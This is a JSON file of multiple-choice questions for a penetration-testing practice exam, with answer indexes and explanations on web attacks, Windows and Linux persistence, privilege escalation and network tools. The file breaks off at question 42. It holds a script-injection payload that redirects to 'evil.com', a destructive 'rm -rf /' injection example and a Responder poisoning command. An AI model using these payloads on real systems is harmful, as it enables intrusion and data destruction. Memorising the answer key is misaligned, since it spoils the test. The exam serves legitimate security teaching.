{
  "category": "penplus",
  "testId": 6,
  "testName": "Pentest Practice Test #6 (Formidable)",
  "xpPerCorrect": 10,
  "questions": [
    {
      "id": 1,
      "question": "You are performing a penetration test against a web application and discover a potential Blind SQL injection vulnerability. Which of the following techniques would be MOST effective for confirming and exploiting this vulnerability?",
      "options": [
        "Injecting JavaScript code into input fields to test for Cross-Site Scripting (XSS).",
        "Using time-based techniques (e.g., injecting `SLEEP()` commands) or boolean-based techniques (asking true/false questions through SQL) to infer information from the database.",
        "Performing a denial-of-service (DoS) attack against the web server.",
        "Attempting to upload a web shell to the server."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Blind SQL injection doesn't provide direct error messages or visible output.  Exploitation relies on inferring information based on the application's *behavior*. Time-based techniques use delays (e.g., `SLEEP()` in MySQL) to determine if a condition is true or false. Boolean-based techniques craft queries that return different results based on true/false conditions. XSS is a different vulnerability, DoS disrupts service, and web shell uploads are more likely with file upload vulnerabilities.",
      "examTip": "Blind SQLi = Inferring information through application behavior (time-based or boolean-based)."
    },
    {
      "id": 2,
      "question": "You are performing a wireless penetration test against a network using WPA2-Enterprise with EAP-TLS authentication. Which of the following is the MOST likely attack vector?",
      "options": [
        "Capturing the four-way handshake and performing an offline brute-force attack.",
        "Performing a WPS PIN attack.",
        "Targeting vulnerabilities in the EAP-TLS implementation, such as improper certificate validation or weak cipher suites.",
        "Using an evil twin attack."
      ],
      "correctAnswerIndex": 2,
      "explanation": "EAP-TLS relies on digital certificates for both client and server authentication. Attacks often focus on weaknesses in certificate validation (e.g., accepting self-signed certificates, not checking revocation status) or exploiting weak cryptographic configurations. Offline brute-force is not feasible against the handshake in WPA2-Enterprise. WPS is typically not used with Enterprise. Evil twin is a possibility, but targeting EAP-TLS directly is often more effective.",
      "examTip": "WPA2-Enterprise with EAP-TLS = Target certificate validation and crypto weaknesses."
    },
    {
        "id": 3,
        "question": "Examine the following `iptables` rules (assume a default DROP policy for the INPUT chain):\n```bash\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A INPUT -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -p tcp --dport 443 -j ACCEPT\n```\nWhat is a potential security weakness in this configuration?",
        "options":[
            "It allows all incoming traffic.",
            "It allows new incoming connections on ports 80 and 443, potentially exposing vulnerable services even if they are not properly secured.",
            "It blocks all incoming traffic.",
            "It only allows established connections, which is too restrictive."
        ],
        "correctAnswerIndex": 1,
        "explanation":"The rules allow *new* incoming connections on ports 80 (HTTP) and 443 (HTTPS).  While the `ESTABLISHED,RELATED` rule protects ongoing connections, the rules explicitly permit *new* connections on these ports. If a vulnerable web application or service is listening on those ports, an attacker could directly connect and exploit it, *without* needing to bypass any existing connection tracking. A more secure configuration would often use a more restrictive approach, potentially limiting access based on source IP address or other factors. The rules *do not* allow *all* incoming traffic (the default DROP policy prevents that), and they don't *only* allow established connections (the rules for ports 80 and 443 explicitly allow new connections).",
        "examTip": "Carefully analyze `iptables` rules for unintended consequences, especially related to NEW connections."
    },
    {
      "id": 4,
      "question": "You have obtained a limited user shell on a Windows system. You want to escalate your privileges. Which of the following techniques is LEAST likely to be successful if the system is fully patched and has up-to-date antivirus software?",
      "options": [
        "Exploiting a known kernel vulnerability.",
        "Leveraging misconfigured service permissions.",
        "Using a publicly available exploit for an unpatched service.",
        "Extracting credentials from memory using Mimikatz."
      ],
      "correctAnswerIndex": 2,
      "explanation": "If the system is fully patched, publicly available exploits for *unpatched* services are unlikely to work. Kernel vulnerabilities are also less likely to be present on a patched system. Misconfigured services and credential extraction (using tools like Mimikatz, which might be detected by AV) are *still potential* avenues for privilege escalation, even on a patched system.  However, a *publicly available exploit for an unpatched service* on a *fully patched system* is the least likely to succeed.",
      "examTip": "Fully patched systems are less vulnerable to publicly known exploits."
    },
    {
        "id": 5,
        "question":"Analyze this Python code snippet:\n```python\nimport subprocess\n\ndef run_command(command):\n    result = subprocess.run(command, shell=True, capture_output=True, text=True)\n    return result.stdout\n\nuser_input = input(\"Enter a command: \")\noutput = run_command(user_input)\nprint(output)\n```\nWhat is the MAJOR security vulnerability present in this code?",
        "options":[
            "Cross-site scripting (XSS)",
            "Command injection",
            "SQL injection (SQLi)",
            "Denial-of-service (DoS)"
        ],
        "correctAnswerIndex": 1,
        "explanation":"The code is vulnerable to command injection because it uses `subprocess.run` with `shell=True` and directly incorporates user input (`user_input`) into the command string. This allows an attacker to inject arbitrary shell commands.  For example, if the user enters `; rm -rf /`, the entire command becomes `rm -rf /`, which could be disastrous. The vulnerability is not XSS, SQLi, or DoS.",
        "examTip": "`subprocess.run(..., shell=True)` with user input = High risk of command injection."
    },
    {
      "id": 6,
       "question": "Which of the following is a common technique used to maintain persistence on a compromised Linux system?",
       "options": [
         "Using strong passwords.",
         "Modifying system startup scripts (e.g., in /etc/init.d/, systemd units, or rc.local), creating cron jobs, or adding a user with elevated privileges.",
         "Enabling a firewall.",
         "Updating the operating system regularly."
       ],
       "correctAnswerIndex": 1,
       "explanation": "Persistence mechanisms ensure that attacker-controlled code runs even after reboots or user logouts.  Modifying system startup scripts, creating scheduled tasks (cron jobs), or adding a privileged user are common techniques.  Strong passwords, firewalls, and updates are *defensive* measures.",
       "examTip": "Startup scripts, cron jobs, user accounts = Persistence on Linux."
    },
    {
      "id": 7,
      "question": "You are performing a penetration test and discover a web application that is vulnerable to XML External Entity (XXE) injection. Which of the following is the MOST likely impact of this vulnerability?",
      "options": [
        "An attacker can force the user to perform unintended actions on the web application.",
        "An attacker can read arbitrary files from the web server's file system, potentially access internal network resources, or cause a denial-of-service.",
        "An attacker can inject malicious scripts into web pages viewed by other users.",
        "An attacker can gain access to the web server's database."
      ],
      "correctAnswerIndex": 1,
      "explanation": "XXE injection exploits vulnerabilities in how XML parsers handle external entities. This can allow an attacker to read local files, access internal network resources (through SSRF-like techniques), or cause a denial-of-service by consuming server resources. Forcing unintended actions is CSRF. Injecting scripts is XSS. Database access might be a *consequence* of XXE, but it's not the direct and primary impact.",
      "examTip": "XXE = Reading files, accessing internal resources, DoS."
    },
    {
        "id": 8,
        "question": "Review the following Nmap command: `nmap -sS -T4 -A -v 192.168.1.1/24`\nWhat is the purpose of the `-T4` option?",
        "options":[
           "It specifies the target IP address range.",
           "It sets the timing template to 'aggressive', making the scan faster but potentially less stealthy and more likely to be detected.",
           "It enables service version detection.",
           "It enables OS detection."
        ],
        "correctAnswerIndex": 1,
        "explanation": "The `-T` option in Nmap controls the timing template.  `-T4` (aggressive) is a fast scan, but it's more likely to be detected by intrusion detection/prevention systems. The target IP range is specified by `192.168.1.1/24`. Service version detection is `-sV` (part of `-A`), and OS detection is `-O` (also part of `-A`).",
        "examTip": "Nmap `-T` option = Timing template (speed vs. stealth)."
    },
     {
      "id": 9,
       "question": "Which of the following is a common technique for evading detection by antivirus software?",
       "options":[
        "Using well-known malware signatures.",
        "Using packers, crypters, polymorphism, or obfuscation to alter the appearance of the malware, making it harder for signature-based detection to identify it.",
        "Keeping the antivirus software up-to-date.",
        "Using default antivirus settings."
       ],
       "correctAnswerIndex": 1,
       "explanation": "Attackers use various techniques to make their malware look different from known samples, bypassing signature-based detection. Using known signatures would *trigger* detection. Keeping antivirus up-to-date and using default settings are good security practices, but they don't help *evade* detection.",
       "examTip": "Packers, crypters, polymorphism, obfuscation = Antivirus evasion."
    },
    {
        "id": 10,
        "question": "Examine the following lines from a `/etc/passwd` file on a Linux system:\n```\nroot:x:0:0:root:/root:/bin/bash\nuser1:x:1001:1001:User One:/home/user1:/bin/bash\nuser2:x:1002:1002::/home/user2:\n```\nWhat can you conclude about `user2` based on this information?",
        "options":[
           "User2 has a disabled account.",
           "User2 has root privileges.",
           "User2 has no shell assigned, likely preventing interactive login.",
           "User2's home directory is misconfigured"
        ],
        "correctAnswerIndex": 2,
        "explanation": "The last field in the `/etc/passwd` entry specifies the user's login shell.  For `user2`, this field is empty.  While not strictly *disabling* the account, the lack of a shell usually prevents interactive login (e.g., via SSH). `user2` does *not* have root privileges (that's indicated by UID 0, like the `root` user).  The home directory is specified correctly. The 'x' indicates that the password is not stored in this file and will be located in /etc/shadow.",
        "examTip": "Empty shell field in `/etc/passwd` often means no interactive login."
    },
     {
       "id": 11,
        "question": "Which of the following is the MOST effective way to mitigate the risk of 'man-in-the-middle' (MitM) attacks on a wired network?",
        "options":[
           "Using strong passwords for all user accounts.",
           "Implementing port security on network switches, using strong authentication protocols (e.g., 802.1X), and properly configuring VLANs.",
           "Enabling two-factor authentication for all user accounts.",
           "Regularly updating software on all network devices."
        ],
        "correctAnswerIndex": 1,
        "explanation": "Port security (restricting the number of MAC addresses allowed per port, or using static MAC address assignments) helps prevent ARP poisoning, a common MitM technique on wired networks. Strong authentication (like 802.1X) ensures only authorized devices connect. Proper VLAN configuration isolates traffic. Strong passwords and 2FA are important, but don't directly prevent MitM. Updates are crucial for overall security.",
        "examTip": "Port security, 802.1X, VLANs = Mitigating MitM on wired networks."
     },
    {
        "id": 12,
        "question": "You are performing a penetration test and discover a web application that is vulnerable to Server-Side Request Forgery (SSRF). Which of the following is the MOST likely impact of this vulnerability?",
        "options":[
           "An attacker can force the user to perform unintended actions on the web application.",
           "An attacker can make the vulnerable server send requests to arbitrary internal or external resources, potentially accessing sensitive data or interacting with internal systems.",
           "An attacker can inject malicious scripts into web pages viewed by other users.",
           "An attacker can gain access to the web server's database."
        ],
        "correctAnswerIndex": 1,
        "explanation": "SSRF allows an attacker to make the *server* send requests on their behalf. This can be used to access internal resources (that are not directly accessible from the internet), scan internal networks, or even interact with other services.  Forcing unintended user actions is CSRF. Injecting scripts is XSS. Database access might be a *consequence* of SSRF, but it's not the defining characteristic.",
        "examTip": "SSRF = Making the server send requests on the attacker's behalf."
    },
    {
        "id": 13,
        "question":"What is 'token impersonation' in the context of Windows security?",
        "options":[
           "A type of social engineering attack.",
           "A technique where an attacker with access to a user's token can impersonate that user and perform actions with their privileges.",
           "A method for encrypting data on a Windows system.",
           "A way to improve network performance."
        ],
        "correctAnswerIndex": 1,
        "explanation": "Windows uses access tokens to represent the security context of a process or thread. If an attacker can obtain or create a token for another user (especially a privileged user), they can impersonate that user and gain their access rights.  It's not a social engineering attack, encryption method, or performance improvement technique.",
        "examTip":"Token impersonation = Impersonating a user by using their access token (Windows)."
    },
    {
        "id": 14,
        "question": "Which of the following is a common technique for discovering and exploiting vulnerabilities in web applications?",
        "options":[
           "Shoulder surfing.",
          "Using automated web application vulnerability scanners (like Burp Suite, OWASP ZAP, Nikto) in conjunction with manual testing and analysis of the application's logic and behavior.",
          "Phishing.",
          "Social engineering."
        ],
        "correctAnswerIndex": 1,
        "explanation": "Automated scanners provide a broad initial assessment, while manual testing allows for deeper analysis and the discovery of more subtle vulnerabilities, including business logic flaws. Shoulder surfing, phishing, and social engineering are different reconnaissance or attack techniques.",
        "examTip": "Automated scanners + manual testing = Comprehensive web application security testing."
    },
    {
        "id": 15,
         "question": "You are reviewing the configuration of a web server.  Which of the following HTTP response headers, if misconfigured or missing, could expose the web application to increased risk of Cross-Site Scripting (XSS) attacks?",
         "options":[
            "Server",
            "Content-Security-Policy (CSP)",
            "X-Frame-Options",
            "Strict-Transport-Security (HSTS)"
         ],
         "correctAnswerIndex": 1,
         "explanation": "Content-Security-Policy (CSP) is a powerful mechanism for controlling the resources (scripts, stylesheets, images, etc.) that a browser is allowed to load, significantly mitigating the risk of XSS. A *missing* or *weakly configured* CSP increases the risk.  The `Server` header reveals server information (information disclosure). `X-Frame-Options` prevents clickjacking. `Strict-Transport-Security` enforces HTTPS.",
         "examTip": "Content-Security-Policy (CSP) = Strong defense against XSS."
    },
     {
        "id": 16,
        "question": "Examine the following command:\n```bash\nresponder -I eth0 -wb\n```\nWhat is this command MOST likely doing?",
        "options":[
          "Scanning for open ports on the network.",
          "Performing LLMNR, NBT-NS, and MDNS poisoning attacks, and setting up rogue WPAD and authentication servers.",
          "Analyzing network traffic for vulnerabilities.",
          "Cracking Wi-Fi passwords."
        ],
        "correctAnswerIndex": 1,
        "explanation": "Responder is a specialized tool for LLMNR/NBT-NS/MDNS poisoning. `-I eth0` specifies the network interface. `-w` sets up a rogue WPAD proxy autoconfig server. `-b` enables basic HTTP authentication on the rogue server. This combination is used to capture NTLM hashes from Windows systems. It's not a general port scanner, traffic analyzer, or Wi-Fi cracker.",
        "examTip": "Responder = LLMNR/NBT-NS/MDNS poisoning and credential harvesting."
    },
    {
       "id": 17,
        "question":"What is 'pass-the-ticket'?",
        "options":[
          "A type of social engineering attack.",
          "A technique where an attacker uses a captured Kerberos ticket to authenticate to a service without needing the user's password.",
          "A method for encrypting data on a Windows system.",
          "A way to improve network performance."
        ],
        "correctAnswerIndex": 1,
        "explanation": "Pass-the-ticket, similar in concept to pass-the-hash, exploits the Kerberos authentication protocol.  If an attacker can obtain a valid Kerberos ticket (e.g., through Kerberoasting or other attacks), they can use it to authenticate to services without needing the user's actual password. It's not a social engineering attack, encryption method, or performance improvement technique.",
        "examTip":"Pass-the-ticket = Authentication using a Kerberos ticket."
    },
    {
        "id": 18,
        "question": "Which of the following is a common technique used to maintain access to a compromised system after the initial exploit?",
        "options":[
          "Reporting the vulnerability to the system owner.",
          "Installing a backdoor, creating a persistent connection (e.g., reverse shell), modifying system configurations, or creating a new user account.",
          "Documenting the steps taken to compromise the system.",
          "Patching the vulnerability that was exploited."
        ],
        "correctAnswerIndex": 1,
        "explanation": "Persistence mechanisms allow an attacker to regain access even after the initial exploit is discovered or the system is rebooted.  Reporting vulnerabilities and documenting steps are part of ethical hacking, and patching is a defensive measure.",
        "examTip": "Backdoors, persistent connections, system modifications = Maintaining access (persistence)."
    },
     {
        "id": 19,
        "question": "What is the primary purpose of using 'nikto' in a penetration test?",
        "options":[
           "To scan for open ports on a target system.",
           "To perform a vulnerability scan specifically against web servers, identifying common misconfigurations and outdated software.",
           "To analyze network traffic to capture passwords.",
           "To crack Wi-Fi passwords."
        ],
        "correctAnswerIndex": 1,
        "explanation": "Nikto is a web server vulnerability scanner. It checks for outdated software, dangerous files and CGIs, and other common web server security issues.  While it might reveal open ports as part of its scan, Nmap is better for general port scanning. It's not primarily for traffic analysis (Wireshark) or Wi-Fi cracking (Aircrack-ng).",
        "examTip": "Nikto = Web server vulnerability scanner."
    },
    {
        "id": 20,
        "question":"Examine this HTTP request:\n```\nPOST /comment.php HTTP/1.1\nHost: example.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 68\n\nname=Test&comment=<script>window.location='http://evil.com'</script>\n```\nWhat type of attack is MOST likely being attempted, and what is a potential consequence if successful?",
        "options":[
          "SQL Injection; the attacker could gain access to the database.",
          "Cross-Site Scripting (XSS); the attacker could redirect users to a malicious website.",
          "Cross-Site Request Forgery (CSRF); the attacker could force the user to perform unintended actions.",
          "Denial-of-Service (DoS); the attacker could make the website unavailable."
        ],
        "correctAnswerIndex": 1,
        "explanation": "The `<script>` tag in the `comment` parameter is a clear attempt to inject JavaScript code. This is a Cross-Site Scripting (XSS) attack. If successful, the injected script could be executed in the browsers of other users who view the comment, potentially redirecting them to a malicious site (`http://evil.com` in this case), stealing cookies, or defacing the page.  It's not SQL injection (which targets databases), CSRF (which forces unintended actions through legitimate requests), or DoS (which disrupts service).",
        "examTip": "`<script>` tag in user input = High probability of XSS."
    },
    {
            "id": 21,
            "question": "Which of the following is a common technique for identifying the operating system and services running on a remote host?",
            "options":[
               "Shoulder surfing.",
               "Using Nmap with options like `-O` (OS detection) and `-sV` (service version detection), or other specialized fingerprinting tools.",
               "Phishing.",
               "Social Engineering."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Nmap's `-O` and `-sV` options, along with other fingerprinting tools, analyze network responses to determine the OS and running services. Shoulder surfing, phishing, and social engineering are different reconnaissance or attack techniques.",
            "examTip": "Nmap `-O` (OS detection) and `-sV` (service version detection) = Remote OS and service identification."
        },
        {
           "id": 22,
           "question": "What is the primary difference between 'stored XSS' (persistent XSS) and 'reflected XSS'?",
           "options":[
            "Stored XSS is more severe than reflected XSS.",
            "Stored XSS involves the malicious script being permanently stored on the target server (e.g., in a database), while reflected XSS involves the script being reflected off the web server and executed in the user's browser as part of a response to a specific request.",
            "Reflected XSS is more severe than stored XSS.",
            "There is no significant difference."
           ],
           "correctAnswerIndex": 1,
           "explanation": "The key difference is where the malicious script resides. Stored XSS is persistent – it's saved on the server and served to *every* user who visits the affected page. Reflected XSS is not persistent – it's only executed when a user clicks a malicious link or submits a crafted form. While stored XSS is often considered *more* dangerous due to its wider reach, both types can be severe. The *impact* depends on the specific context and what the script does.",
           "examTip": "Stored XSS = Script saved on server; Reflected XSS = Script reflected in response."
        },
        {
            "id": 23,
             "question": "Which of the following is a common method for performing a 'denial-of-service' (DoS) attack?",
             "options":[
                "Sending phishing emails to users.",
                "Flooding a target system or network with a large volume of traffic or requests, overwhelming its resources and making it unavailable to legitimate users.",
                "Exploiting a vulnerability in a web application to inject malicious SQL code.",
                "Cracking passwords using a brute-force attack."
             ],
             "correctAnswerIndex": 1,
             "explanation": "DoS attacks aim to disrupt service availability by overwhelming the target. Phishing is a social engineering technique, SQL injection targets databases, and brute-force attacks target passwords.",
             "examTip": "DoS = Overwhelming a system to disrupt service."
        },
        {
           "id": 24,
           "question": "You are performing a penetration test of a web application and discover that it is vulnerable to 'directory traversal'.  What is the MOST likely consequence of this vulnerability?",
           "options":[
               "An attacker can inject malicious scripts into web pages viewed by other users.",
               "An attacker can read arbitrary files from the web server's file system, potentially including configuration files, source code, or other sensitive data.",
               "An attacker can force a user to perform unintended actions on the web application.",
               "An attacker can gain access to the web server's database."
           ],
           "correctAnswerIndex": 1,
           "explanation": "Directory traversal (also known as path traversal) allows an attacker to escape the web root directory and access files that should be restricted. Injecting scripts is XSS, forcing unintended actions is CSRF, and while database access *might* be a *consequence* of directory traversal (e.g., by reading configuration files with database credentials), it's not the defining characteristic.",
           "examTip": "Directory traversal = Accessing files outside the web root."
        },
        {
            "id": 25,
             "question": "Which of the following is a common technique used to prevent 'cross-site request forgery' (CSRF) attacks?",
             "options":[
                "Using strong, unique passwords for all user accounts.",
                "Using synchronizer tokens (anti-CSRF tokens), checking the HTTP Referer header (though this is less reliable), and implementing other defense-in-depth measures.",
                "Enabling HTTPS for all web traffic.",
                "Regularly updating the web application's software."
             ],
             "correctAnswerIndex": 1,
             "explanation": "Synchronizer tokens are the most robust defense against CSRF. They ensure that requests originated from the legitimate application. While the Referer header can provide some protection, it's not as reliable. Strong passwords, HTTPS, and updates are important security practices, but they don't directly prevent CSRF.",
             "examTip": "Synchronizer tokens (anti-CSRF tokens) = Primary defense against CSRF."
        },
         {
            "id": 26,
            "question": "You are performing a penetration test and want to identify all the subdomains associated with a target domain (example.com). Which of the following is the LEAST effective method?",
            "options":[
                "Using tools like Sublist3r, Amass, or subfinder.",
                "Performing DNS reconnaissance (e.g., zone transfer attempts, brute-forcing common subdomain names).",
                "Searching public certificate transparency logs.",
                "Asking the target organization's marketing department."
            ],
            "correctAnswerIndex": 3,
            "explanation": "Asking the marketing department directly defeats the purpose of reconnaissance and is unlikely to provide a complete or accurate list. Subdomain enumeration tools, DNS reconnaissance, and searching certificate transparency logs are all effective methods for discovering subdomains. Certificate transparency logs are a public record of issued SSL/TLS certificates, often revealing subdomains that might not be easily discoverable otherwise.",
            "examTip": "Subdomain enumeration tools, DNS reconnaissance, certificate transparency logs = Finding subdomains."
        },
        {
            "id": 27,
            "question": "What is 'LDAP injection'?",
            "options":[
               "A type of social engineering attack.",
               "An attack that exploits vulnerabilities in how an application handles user input when constructing LDAP (Lightweight Directory Access Protocol) queries, allowing an attacker to potentially access or modify directory information.",
               "A method for encrypting data transmitted over a network.",
               "A way to improve network performance."
            ],
            "correctAnswerIndex": 1,
            "explanation": "LDAP injection is similar in concept to SQL injection, but it targets LDAP directories instead of SQL databases.  It's not a social engineering attack, encryption method, or performance improvement technique.",
            "examTip": "LDAP injection = Injecting malicious LDAP queries."
        },
        {
          "id": 28,
          "question": "Which of the following is the MOST important principle to follow when handling sensitive data discovered during a penetration test?",
          "options":[
            "Immediately downloading all the data to your own system for analysis.",
            "Following the agreed-upon rules of engagement and communication plan, ensuring that any handling of sensitive data is authorized, documented, and secure, and reporting the discovery promptly to the client.",
            "Posting the data on a public forum to demonstrate the vulnerability.",
            "Ignoring the data and continuing with other testing activities."
          ],
          "correctAnswerIndex": 1,
          "explanation": "Ethical hacking requires strict adherence to the rules of engagement and responsible handling of sensitive information. Downloading data without authorization, public disclosure, or ignoring the discovery are all unethical and potentially illegal.",
          "examTip": "Handle sensitive data according to the rules of engagement and with extreme care."
        },
        {
            "id": 29,
            "question": "What is the purpose of using a 'web proxy' (like Burp Suite or OWASP ZAP) during web application penetration testing?",
            "options":[
              "To encrypt all web traffic.",
              "To intercept, inspect, modify, and replay HTTP/HTTPS requests and responses, allowing for detailed analysis and testing of the application's behavior.",
              "To scan for open ports on the target web server.",
              "To crack user passwords."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Web proxies are essential tools for web application testing, providing a 'man-in-the-middle' view of the communication between the browser and the server. While some proxies may handle encryption/decryption, their primary purpose is not simply encryption. They are not port scanners or password crackers.",
            "examTip": "Web proxy (Burp Suite, OWASP ZAP) = Intercepting and manipulating web traffic."
        },
        {
            "id": 30,
            "question": "Examine the following command:\n```bash\nssh -L 8080:127.0.0.1:80 user@example.com\n```\nWhat is this command MOST likely doing?",
            "options":[
               "Performing a port scan of example.com.",
               "Creating an SSH tunnel, forwarding local port 8080 to port 80 on the remote machine (example.com) via the loopback address(127.0.0.1).",
               "Installing an SSH server on example.com.",
               "Cracking passwords on example.com."
            ],
            "correctAnswerIndex": 1,
            "explanation": "This command uses SSH to create a secure tunnel. `-L 8080:127.0.0.1:80` specifies local port forwarding: traffic sent to port 8080 on the *local* machine will be forwarded to port 80 on the *remote* machine (`example.com`) *as seen from the perspective of example.com*. This is a way to access services running on the remote machine (or a machine accessible from the remote machine) as if they were running locally. It's not a port scan, server installation, or password cracking.",
            "examTip": "SSH tunneling (`-L`) = Securely forwarding ports."
        },
        {
            "id": 31,
            "question": "Which of the following is a key difference between 'black box', 'white box', and 'gray box' penetration testing?",
            "options":[
                "Black box testing is always performed remotely; white box and gray box testing are always performed on-site.",
                "Black box testing involves no prior knowledge of the target system; white box testing involves full knowledge (including source code, architecture diagrams, etc.); gray box testing involves partial knowledge (e.g., network diagrams, API documentation).",
                "Black box testing is only used for web applications; white box and gray box testing are only used for network infrastructure.",
                "There is no significant difference between the three."
            ],
            "correctAnswerIndex": 1,
            "explanation": "The defining characteristic is the *level of prior knowledge* provided to the penetration testing team.  The location (remote/on-site) and target type (web app/network) can vary for all three types.",
            "examTip": "Black box = No knowledge; White box = Full knowledge; Gray box = Partial knowledge."
        },
        {
             "id": 32,
             "question": "What is the primary purpose of a 'lessons learned' meeting after a penetration test?",
             "options":[
               "To assign blame to individuals for any vulnerabilities discovered.",
               "To identify areas for improvement in the penetration testing process itself, and to discuss how to conduct future engagements more effectively.",
               "To celebrate the successful completion of the penetration test.",
               "To present the findings of the penetration test to the client (this is a separate step)."
             ],
             "correctAnswerIndex": 1,
             "explanation": "The lessons learned meeting is a crucial part of continuous improvement, focusing on refining the *process* of penetration testing, not on assigning blame, celebrating, or presenting the findings to the client (which is done separately).",
             "examTip": "Lessons learned = Improving the penetration testing *process*."
        },
        {
            "id": 33,
            "question": "Which of the following is a common technique for performing a 'denial-of-service' (DoS) attack?",
            "options":[
               "Sending phishing emails to users.",
               "Flooding a target system or network with traffic (e.g., SYN floods, UDP floods), overwhelming its resources and making it unavailable to legitimate users, or exploiting vulnerabilities that cause the service to crash.",
               "Exploiting a vulnerability in a web application to inject malicious SQL code.",
               "Cracking passwords using a brute-force attack."
            ],
            "correctAnswerIndex": 1,
            "explanation": "DoS attacks aim to disrupt service availability. Flooding with traffic is a common method, but exploiting vulnerabilities that cause crashes can also achieve a denial of service. Phishing is social engineering, SQL injection targets databases, and brute-force attacks target passwords.",
            "examTip": "DoS = Disrupting service availability (often by flooding)."
        },
        {
           "id": 34,
            "question":"What is 'cross-site request forgery' (CSRF)?",
            "options":[
              "A type of denial-of-service attack.",
              "An attack that forces an authenticated end user to execute unwanted actions on a web application in which they are currently logged in.",
              "A method for encrypting web traffic.",
              "A type of password cracking technique."
            ],
            "correctAnswerIndex": 1,
            "explanation":"CSRF exploits the trust a web application has in a user's browser. The attacker tricks the browser into sending requests that the user didn't intend, but which the application treats as legitimate because the user is already logged in. It's not a DoS attack, encryption method, or password cracking technique.",
            "examTip": "CSRF = Forcing unintended user actions on a web application."
        },
        {
           "id": 35,
           "question": "Which of the following is a common technique for identifying vulnerabilities in web applications?",
           "options":[
              "Shoulder surfing.",
              "Using automated web application vulnerability scanners (like Burp Suite, OWASP ZAP, Nikto) in conjunction with manual testing, code review, and analysis of the application's logic and behavior.",
              "Phishing.",
              "Social engineering."
           ],
           "correctAnswerIndex": 1,
           "explanation": "Automated scanners and manual testing, including code review (when possible), are the most comprehensive approach to finding web application vulnerabilities. Shoulder surfing, phishing, and social engineering are different reconnaissance or attack techniques.",
           "examTip": "Automated scanners + manual testing + code review = Web application vulnerability identification."
        },
         {
            "id": 36,
             "question": "What is 'clickjacking'?",
             "options":[
                "A type of denial-of-service attack.",
                "A technique where an attacker tricks a user into clicking something different from what the user perceives they are clicking, often by using hidden iframes or transparent layers on a web page.",
                "A method for encrypting data transmitted over a network.",
                "A type of social engineering attack."
             ],
             "correctAnswerIndex": 1,
             "explanation": "Clickjacking is a UI-based attack, tricking users into clicking on something they don't intend to, often by manipulating the visual presentation of a web page. It's not a DoS attack, encryption method, or a generic social engineering attack (though it could be used as part of one).",
             "examTip": "Clickjacking = Tricking users into clicking hidden elements."
        },
        {
            "id": 37,
             "question":"Which of the following is a common technique used to escalate privileges on a Linux system after gaining initial access?",
             "options":[
              "Phishing",
              "Exploiting vulnerabilities in SUID binaries, misconfigured services (e.g., weak permissions, exposed daemons), or kernel vulnerabilities.",
              "Social engineering",
              "Shoulder surfing"
             ],
             "correctAnswerIndex": 1,
             "explanation":"SUID binaries (which run with the owner's privileges, often root), misconfigured services, and kernel vulnerabilities are common targets for privilege escalation. Phishing and social engineering are more often used for initial access, not privilege escalation. Shoulder surfing is an information-gathering technique.",
             "examTip":"SUID binaries, misconfigured services, kernel vulnerabilities = Linux privilege escalation."
        },
        {
            "id": 38,
             "question": "What is the purpose of a 'penetration testing methodology'?",
             "options":[
                "To provide a list of all known vulnerabilities.",
                "To offer a structured and repeatable framework for conducting penetration tests, ensuring consistency, thoroughness, and adherence to best practices.",
                "To guarantee that a penetration test will find all security flaws.",
                "To replace the need for skilled penetration testers."
             ],
             "correctAnswerIndex": 1,
             "explanation": "Methodologies (like PTES, OSSTMM, NIST SP 800-115) provide a standardized approach, guiding the penetration testing process and promoting best practices.  They are not exhaustive vulnerability lists, guarantees of complete success, or replacements for skilled professionals.",
             "examTip": "Penetration testing methodology = Structured and repeatable framework."
        },
        {
            "id": 39,
             "question": "Which of the following is a common method for an attacker to maintain persistence on a compromised Windows system?",
             "options":[
                "Regularly updating the operating system.",
                "Creating a scheduled task, modifying the registry (e.g., Run keys, RunOnce keys), installing a malicious service, or using WMI event subscriptions.",
                "Using a strong, unique password for the administrator account.",
                "Enabling the Windows Firewall."
             ],
             "correctAnswerIndex": 1,
             "explanation": "Scheduled tasks, registry modifications, malicious services, and WMI event subscriptions are common persistence mechanisms, allowing attacker-controlled code to run automatically, even after reboots. Updating the OS, strong passwords, and firewalls are *defensive* measures.",
             "examTip": "Scheduled tasks, registry keys, services, WMI = Persistence on Windows."
        },
        {
          "id": 40,
          "question": "Examine the following Nmap command, and its (partial) output:\nCommand: `nmap -sV --script vuln 192.168.1.100`\nPartial Output:\n```\nPORT   STATE SERVICE      VERSION\n80/tcp open  http         Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)\n| http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16\n|_http-title: Site doesn't have a title (text/html).\n139/tcp   open  netbios-ssn  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp   open  netbios-ssn  Samba smbd 4.10.16 (workgroup: WORKGROUP)\n| smb-vuln-ms17-010:\n|   VULNERABLE:\n|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)\n...\n```\nWhat is the MOST significant finding from this Nmap scan?",
          "options":[
            "The web server is running Apache 2.4.6.",
            "The system is vulnerable to the MS17-010 (EternalBlue) vulnerability.",
            "Ports 80, 139, and 445 are open.",
            "The web server's title is missing."
          ],
          "correctAnswerIndex": 1,
          "explanation": "The output clearly indicates that the `smb-vuln-ms17-010` script detected the MS17-010 (EternalBlue) vulnerability, a critical remote code execution flaw in SMBv1. While the other information (open ports, server versions) is relevant, the presence of a known, exploitable RCE vulnerability is the *most* significant finding. The missing title is a minor issue.",
          "examTip": "Nmap's `vuln` scripts highlight known vulnerabilities."
        },
        {
            "id": 41,
            "question":"What is the primary purpose of 'output encoding' in preventing web application vulnerabilities?",
            "options":[
                "To make web pages load faster.",
                "To prevent cross-site scripting (XSS) by converting special characters (like <, >, &, \", ') into their corresponding HTML entities (or appropriate encoding for the context, such as JavaScript encoding).",
                "To encrypt user passwords before storing them in a database.",
                "To improve the visual design and user interface of a website."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Output encoding is a crucial defense against XSS. It ensures that user-supplied data is treated as *data*, not as executable code, by the browser. It's not primarily about website speed, password encryption (which is a separate process), or visual design.",
            "examTip": "Output encoding = Preventing XSS by sanitizing output."
        },
         {
             "id": 42,
            "question":"Which of the following techniques is MOST likely to be used in a 'watering hole' attack?",
            "options":[
